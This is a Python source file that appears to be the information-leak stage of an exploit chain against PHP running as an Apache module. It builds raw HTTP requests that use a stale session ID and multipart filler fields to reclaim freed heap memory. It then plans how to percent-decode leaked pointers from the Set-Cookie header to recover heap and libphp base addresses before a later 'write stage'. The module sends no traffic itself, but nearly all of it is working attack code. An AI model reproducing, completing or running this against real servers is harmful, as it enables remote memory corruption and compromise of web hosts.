#!/usr/bin/env python3
"""leak_stage.py - --step leak dry calibration plan for the mod_php leak channel.

The leak channel is the session machinery Set-Cookie emit: a stale or reclaimed
PS(id) zend_string pointer reaches php_url_encode while the machinery sends the
session cookie. PS(id) storage is the ps_globals struct field at struct offset
16 (a zend_string pointer), so the slot address is ps_globals + 16.

The plan follows blueprint section C: producer exchange P, reclaim exchange R
(multipart t[] filler fields plus one 56 B raw value, zero file parts, stale sid
in the Cookie header), leak read L, percent decode of the Set-Cookie value,
chunk-base and libphp-base candidate checks, and a stability stop rule.

leak_offset is a live measurement. The address profile carries
TBD_measure_live_probe until the live sweep lands a value; the dry plan surfaces
that as status unknown and never substitutes a guessed offset.

No transport: this module builds request shapes and the calibration algorithm
description only. The driver rejects --live for this step.
"""


import hashlib
import json
from pathlib import Path


BOUNDARY = b"NATIVEOUTPUTEXACT"
DEFAULT_PROFILE = (
    Path(__file__).resolve().parents[2] / "addresses" / "apache_libphp.json"
)
STALE_SID = "0123456789abcdef0123456789abcdef"
RECLAIM_FILLERS = 32
RECLAIM_RAW_BYTES = 56
CANONICAL_LOW = 0x0000700000000000
CANONICAL_HIGH = 0x00007FFFFFFFFFFF
MAIN_CHUNK_SIZE = 0x200000


def _sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _hex_int(value) -> int | None:
    if isinstance(value, int) and not isinstance(value, bool):
        return value
    if isinstance(value, str) and value.lower().startswith("0x"):
        try:
            return int(value, 16)
        except ValueError:
            return None
    return None


def field(name: bytes, value: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        + value + b"\r\n"
    )


def reclaim_body() -> bytes:
    """Reclaim shape: many short t[] fillers plus one 56 B raw value."""
    segments = [field(b"t[]", b"T") for _ in range(RECLAIM_FILLERS)]
    segments.append(field(b"r", b"R" * RECLAIM_RAW_BYTES))
    segments.append(b"--" + BOUNDARY + b"--\r\n")
    return b"".join(segments)


def multipart_request(
    host_header: str, path: str, sid: str, body: bytes, tag: str,
) -> bytes:
    return (
        b"POST " + path.encode("ascii") + b" HTTP/1.1\r\n"
        + b"Host: " + host_header.encode("ascii") + b"\r\n"
        + b"Connection: close\r\n"
        + b"Cookie: PHPSESSID=" + sid.encode("ascii") + b"\r\n"
        + b"X-Leak-Step: " + tag.encode("ascii") + b"\r\n"
        + b"Content-Type: multipart/form-data; boundary=" + BOUNDARY + b"\r\n"
        + b"Content-Length: " + str(len(body)).encode("ascii") + b"\r\n\r\n"
        + body
    )


def get_request(host_header: str, path: str, sid: str, tag: str) -> bytes:
    return (
        b"GET " + path.encode("ascii") + b" HTTP/1.1\r\n"
        + b"Host: " + host_header.encode("ascii") + b"\r\n"
        + b"Connection: close\r\n"
        + b"Cookie: PHPSESSID=" + sid.encode("ascii") + b"\r\n"
        + b"X-Leak-Step: " + tag.encode("ascii") + b"\r\n\r\n"
    )


def _meta(order: int, label: str, method: str, path: str, sid: str,
          request: bytes, purpose: str) -> dict:
    return {
        "order": order,
        "label": label,
        "method": method,
        "path": path,
        "cookie_sid": sid,
        "connection": "close",
        "purpose": purpose,
        "bytes": len(request),
        "sha256": _sha(request),
        "artifact": f"{order:02d}-{label}-request.bin",
    }


def load_profile(path: Path | None = None) -> tuple[dict, Path]:
    profile_path = Path(path) if path is not None else DEFAULT_PROFILE
    return json.loads(profile_path.read_text()), profile_path


def engine_addresses(profile: dict, profile_path: Path) -> dict:
    """Resolve the leak engine slots from the address profile, no guesses."""
    engine = profile.get("engine") or {}
    struct = profile.get("struct_offsets") or {}
    binding = profile.get("engine_binding") or {}
    required = {
        "php_url_encode": _hex_int(engine.get("php_url_encode")),
        "ps_globals": _hex_int(engine.get("ps_globals")),
        "ps_id_offset": struct.get("ps_id"),
        "ps_http_session_vars_offset": struct.get("ps_http_session_vars"),
    }
    missing = [name for name, value in required.items() if value is None]
    if missing:
        raise ValueError(
            "address profile lacks the leak engine fields: " + ", ".join(missing)
            + f" (profile {profile_path})"
        )
    ps_globals = required["ps_globals"]
    ps_id_offset = required["ps_id_offset"]
    ps_vars_offset = required["ps_http_session_vars_offset"]
    ps_id_slot = ps_globals + ps_id_offset
    ps_vars_slot = ps_globals + ps_vars_offset
    derived = profile.get("derived_addresses") or {}
    for name, computed in (
        ("ps_id_slot", ps_id_slot),
        ("ps_http_session_vars_slot", ps_vars_slot),
    ):
        recorded = _hex_int(derived.get(name))
        if recorded is not None and recorded != computed:
            raise ValueError(
                f"address profile derived {name} 0x{recorded:x} disagrees with "
                f"ps_globals plus struct offset (0x{computed:x})"
            )
    basic_globals = _hex_int(engine.get("basic_globals"))
    bg_unserialize_offset = struct.get("bg_unserialize")
    bg_unserialize_slot = None
    if basic_globals is not None and bg_unserialize_offset is not None:
        bg_unserialize_slot = basic_globals + bg_unserialize_offset
    return {
        "php_url_encode": f"0x{required['php_url_encode']:x}",
        "php_url_encode_binding": binding.get("php_url_encode"),
        "php_apache_sapi_ub_write": engine.get("php_apache_sapi_ub_write"),
        "ps_globals": f"0x{ps_globals:x}",
        "ps_globals_binding": binding.get("ps_globals"),
        "ps_id": {
            "field": "PS(id)",
            "type": "zend_string *",
            "struct_offset": ps_id_offset,
            "slot": f"0x{ps_id_slot:x}",
        },
        "ps_http_session_vars": {
            "field": "PS(http_session_vars)",
            "type": "zval",
            "struct_offset": ps_vars_offset,
            "slot": f"0x{ps_vars_slot:x}",
        },
        "basic_globals": (
            f"0x{basic_globals:x}" if basic_globals is not None else None),
        "bg_unserialize": (
            {"struct_offset": bg_unserialize_offset,
             "slot": f"0x{bg_unserialize_slot:x}"}
            if bg_unserialize_slot is not None else None),
        "zend_rc_dtor_func": engine.get("zend_rc_dtor_func"),
        "receipt": profile.get("offsets_receipt"),
        "profile": str(profile_path),
    }


def leak_offset_hook(profile: dict, profile_path: Path) -> dict:
    """Measured leak offset slot: TBD stays unknown, never guessed."""
    raw = profile.get("leak_offset")
    value = _hex_int(raw)
    if value is None:
        return {
            "field": "leak_offset",
            "value": raw,
            "status": "unknown",
            "usable": False,
            "source": str(profile_path),
            "note": "TBD_measure_live_probe: the live sweep must land a measured "
                    "offset; the dry plan does not substitute one",
        }
    return {
        "field": "leak_offset",
        "value": f"0x{value:x}",
        "status": "measured",
        "usable": True,
        "source": str(profile_path),
    }


def calibration(profile: dict, addresses: dict, leak_offset: dict) -> dict:
    """Structured section C algorithm: bounds, alignment checks, stops."""
    size_bytes = profile.get("size_bytes")
    p_align = _hex_int(profile.get("p_align"))
    return {
        "channel": {
            "emit": "session machinery Set-Cookie PHPSESSID",
            "encoder": "php_url_encode",
            "encoder_offset": addresses["php_url_encode"],
            "writeback": "php_apache_sapi_ub_write "
                         f"{addresses['php_apache_sapi_ub_write']}",
            "stale_slot": "PS(id) zend_string pointer at ps_globals + "
                          f"{addresses['ps_id']['struct_offset']}",
            "decode": "percent-decode every %XX; php_url_encode escapes bytes "
                      ">= 0x80 and specials, so the decode is 1:1",
            "carrier": "Cookie: PHPSESSID only (session.use_only_cookies=1)",
        },
        "sequence": [
            {"phase": "P", "purpose": "producer request, leaves stale PS(id)"},
            {"phase": "R", "purpose": "reclaim request, seeds freed arena bytes"},
            {"phase": "L", "purpose": "leak read, decode the Set-Cookie value"},
        ],
        "iteration_bounds": {
            "max_exchanges_per_stage": 10,
            "stable_triples_for_stop": 3,
            "exchange_triple_size": 3,
            "set_cookie_cap_bytes": 4096,
            "approx_encoded_pointer_count": 98,
            "min_set_cookie_encoded_chars": 64,
            "pointer_width_bytes": 8,
            "max_producer_shape_iterations": 10,
        },
        "alignment_checks": [
            {"check": "chunk_base_alignment",
             "rule": f"candidate & 0x{MAIN_CHUNK_SIZE - 1:x} == 0",
             "chunk_size": f"0x{MAIN_CHUNK_SIZE:x}"},
            {"check": "chunk_base_canonical_range",
             "rule": f"0x{CANONICAL_LOW:x} <= candidate <= 0x{CANONICAL_HIGH:x}"},
            {"check": "libphp_base_alignment",
             "rule": "candidate & (p_align - 1) == 0",
             "p_align": f"0x{p_align:x}" if p_align is not None else None},
            {"check": "libphp_text_window",
             "rule": "0 <= candidate - libphp_base < size_bytes",
             "size_bytes": size_bytes},
            {"check": "leak_offset_match",
             "rule": "pointer - chunk_base == leak_offset",
             "leak_offset_status": leak_offset["status"]},
            {"check": "set_cookie_decode_roundtrip",
             "rule": "percent-decode is lossless for every encoded byte"},
        ],
        "stop_conditions": [
            {"condition": "chunk_base_stable",
             "rule": "the same 2 MiB aligned chunk base in 3 consecutive "
                     "exchange triples"},
            {"condition": "libphp_base_stable",
             "rule": "the same libphp base in 3 consecutive exchange triples"},
            {"condition": "exchange_cap",
             "rule": "stop after 10 exchanges per stage and report the candidate "
                     "set instead of extending"},
            {"condition": "leak_offset_unmeasured",
             "rule": "with leak_offset status unknown, address matching cannot "
                     "stop; report unknown and do not arm the write stage"},
        ],
        "failure_modes": [
            {"mode": "set_cookie_absent_or_short",
             "check": "Set-Cookie missing or fewer than 64 encoded chars",
             "action": "stale PS(id) was not reached; iterate the producer shape, "
                       "not the leak shape"},
            {"mode": "session_flock_block",
             "check": "same sid requests time out on the session file lock",
             "action": "keep a fresh sid except in the deliberate stale stage"},
            {"mode": "leak_offset_unknown",
             "check": "address profile leak_offset is TBD_measure_live_probe",
             "action": "run the live sweep first; the write stage cannot arm"},
        ],
    }


def dry(host_header: str, path: str, profile_path: Path | None,
        output: Path | None = None) -> dict:
    """Dry plan: request shapes plus the calibration algorithm, zero sockets."""
    profile, resolved_path = load_profile(profile_path)
    addresses = engine_addresses(profile, resolved_path)
    leak_offset = leak_offset_hook(profile, resolved_path)
    body = reclaim_body()
    reclaim_request = multipart_request(
        host_header, path, STALE_SID, body, "reclaim")
    leak_request = multipart_request(
        host_header, path, STALE_SID, body, "leak-read")
    baseline_request = get_request(
        host_header, path, STALE_SID, "baseline-get")
    requests = [
        _meta(1, "reclaim", "POST", path, STALE_SID, reclaim_request,
              "seed the reclaimed arena with t[] fillers plus one 56 B raw value"),
        _meta(2, "leak-read", "POST", path, STALE_SID, leak_request,
              "read the machinery Set-Cookie emit and percent-decode it"),
        _meta(3, "baseline-get", "GET", path, STALE_SID, baseline_request,
              "control read: session state without a machinery body"),
    ]
    blobs = {
        requests[0]["artifact"]: reclaim_request,
        requests[1]["artifact"]: leak_request,
        requests[2]["artifact"]: baseline_request,
    }
    artifacts = {}
    if output is not None:
        output.mkdir(parents=True, exist_ok=True)
        for name, data in blobs.items():
            (output / name).write_bytes(data)
            artifacts[name] = {"bytes": len(data), "sha256": _sha(data)}
    return {
        "stage": "leak",
        "dry_run": True,
        "sent": False,
        "no_transport": True,
        "lane": "modphp",
        "target": {"host_header": host_header, "path": path},
        "address_profile": str(resolved_path),
        "binary": profile.get("binary"),
        "md5": profile.get("md5"),
        "size_bytes": profile.get("size_bytes"),
        "engine_addresses": addresses,
        "leak_offset": leak_offset,
        "probe_requests": requests,
        "calibration": calibration(profile, addresses, leak_offset),
        "shape_parameters": {
            "boundary": BOUNDARY.decode("latin1"),
            "reclaim_fillers": RECLAIM_FILLERS,
            "reclaim_raw_bytes": RECLAIM_RAW_BYTES,
            "file_parts": 0,
            "leak_read_shape": "same reclaim layout, repeated",
            "inference": "fillers, raw value size and the repeated leak layout "
                         "come from blueprint section C; no address is inferred",
        },
        "artifacts": artifacts,
    }
